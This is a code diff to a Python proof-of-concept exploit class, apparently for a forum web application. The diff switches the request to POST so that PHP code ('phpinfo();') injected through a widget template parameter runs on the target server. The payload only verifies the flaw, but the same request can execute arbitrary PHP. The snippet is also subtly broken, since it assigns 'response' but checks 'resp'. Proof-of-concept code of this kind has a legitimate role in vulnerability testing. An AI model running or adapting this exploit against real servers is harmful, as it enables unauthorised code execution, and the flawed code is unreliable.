@@ -39,7 +39,7 @@ class TestPOC(POCBase):
         target = '{u}/ajax/render/widget_tabbedcontainer_tab_panel'.format(u=self.url)
         data = "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();"
         try:
-            response = requests.get(url=target, data=data, verify=False)
+            response = requests.post(url=target, data=data, verify=False)
             if resp.status_code == 200 and 'PHP API' in resp.text:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = target
